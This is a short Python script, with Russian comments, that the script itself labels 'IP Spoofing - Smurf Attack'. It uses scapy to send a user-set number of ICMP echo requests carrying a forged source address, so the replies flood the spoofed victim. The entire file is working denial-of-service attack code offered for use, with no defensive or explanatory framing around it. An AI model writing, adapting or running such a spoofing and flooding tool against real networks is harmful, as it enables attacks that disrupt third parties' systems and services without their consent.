#!/usr/bin/env python3
try:
    from scapy.all import IP, ICMP, Raw, send
except ImportError as e:
    print(e)
    exit(1)

import argparse
import random
import string

def get_args():
    parser = argparse.ArgumentParser(
        prog='main.py',
        description='IP Spoofing - Smurf Attack',
        formatter_class=lambda prog: argparse.HelpFormatter(prog, max_help_position=80)
    )
    parser.add_argument("-s", "--src", required=True, help="IP для подделки (spoofing)")
    parser.add_argument("-d", "--dst", required=True, help="IP, которому будет отправлен echo reply")
    parser.add_argument("-n", "--count", type=int, required=True, help="Количество пакетов для отправки")
    parser.add_argument("-l", "--size", type=int, help="Размер буфера (payload)")
    return parser.parse_args()

def get_raw(size):
    if size is None:
        return "abcdefghijklmnopqrstuvwabcdefghi"
    if size <= 44:
        return "ab"
    # Генерация случайной строки длиной size-42 символа
    return ''.join(random.choices(string.ascii_lowercase, k=size - 42))

def main():
    args = get_args()
    base_seq = random.randint(10, 20)
    base_ttl = random.randint(100, 150)
    raw_data = get_raw(args.size)

    def packet_generator():
        for i in range(args.count):
            # Для каждого пакета вычисляем новое значение seq и ttl (с небольшим случайным сдвигом)
            pkt = IP(src=args.src, dst=args.dst, ttl=base_ttl + random.randint(-2, 2)) / \
                  ICMP(type="echo-request", id=1, seq=base_seq + i) / \
                  Raw(raw_data)
            yield pkt

    send(packet_generator(), verbose=0)

if __name__ == "__main__":
    main()
